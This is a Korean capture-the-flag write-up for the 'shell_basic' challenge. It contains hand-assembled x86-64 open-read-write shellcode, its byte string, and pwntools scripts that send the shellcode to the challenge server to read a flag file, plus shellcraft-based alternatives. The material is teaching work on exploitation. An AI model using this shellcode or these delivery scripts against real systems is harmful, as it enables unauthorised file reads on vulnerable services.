## shell_basic
---

입력한 셸코드를 실행하는 프로그램입니다.

main 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.

flag 위치와 이름은 ```/home/shell_basic/flag_name_is_loooooong```입니다.

<br><br>

## Solution 1 (셸코드를 만들어서 보내기)
---

어셈블리 코드를 짜서 보냈다.

<br>

```nasm
; File name: shellcode.asm

section .text
global _shell

_shell:

    ; Flag Path : /home/shell_basic/flag_name_is_loooooong
    ; 2f686f6d652f7368 656c6c5f62617369 632f666c61675f6e 616d655f69735f6c 6f6f6f6f6f6f6e67
    ; int fd = open("/home/shell_basic/flag_name_is_loooooong",R_DONLY,NULL)
    
    xor rax, rax    ; NULL,
    push rax
    mov rax, 0x676e6f6f6f6f6f6f ;6f6f6f6f6f6f6e67
    push rax
    mov rax, 0x6c5f73695f656d61 ; 616d655f69735f6c
    push rax
    mov rax, 0x6e5f67616c662f63 ; 632f666c61675f6e
    push rax
    mov rax, 0x697361625f6c6c65 ; 656c6c5f62617369
    push rax
    mov rax, 0x68732f656d6f682f ; 2f686f6d652f7368
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    syscall

    ; read(fd, buf, 0x30)
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30
    mov rdx, 0x30
    xor rax, rax
    syscall

    ; write(1, buf, 0x30)
    mov rdi, 0x1
    mov rax, 0x1
    syscall
```

<br>

```linux
$ nasm -f elf64 shellcode.asm
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
```

<br>

방법은 2가지가 있는데, 직접 출력결과를 nc의 입력값으로 보내는 것과, pwntools로 보내는 방법이 있다.

직접 보내는 것은 단순하게 ```cat shellcode.bin | nc host3.dreamhack.games 15305```로 보내면 된다.

pwntools는 아래와 같다.

<br>

출력 결과를 보고 16진수 형태의 바이트를 만들어 주면 된다. (일일이 해야만 하나?)

따라서 만들어진 셸코드는 아래와 같다.

<br>

shellcode = ```\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05```

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games', 17070)

shellcode = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05"

p.sendlineafter('shellcode:',shellcode)
print(p.recvall())
```

<br><br>
<br><br>

## Solution 2 (pwntools shellcraft 사용)
---

Link : <a href="https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib-shellcraft-amd64-shellcode-for-amd64" target="_blank">docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib-shellcraft-amd64-shellcode-for-amd64</a>

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games', 20429)

context(arch='amd64', os='linux')

sh = shellcraft.open('/home/shell_basic/flag_name_is_loooooong')
sh += shellcraft.read('rax', 'rsp', 50)
sh += shellcraft.write(1,'rsp', 50)

p.sendlineafter(':', asm(sh))
print(p.recvall())#.decode('cp949')) 또는 p.interactive()
```

<br>

또는 풀이를 보니 이런 것도 있었다.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games', 20429)

context(arch='amd64', os='linux')

sh = shellcraft.cat("/home/shell_basic/flag_name_is_loooooong")
p.sendlineafter(":", asm(sh))
p.interactive()
```
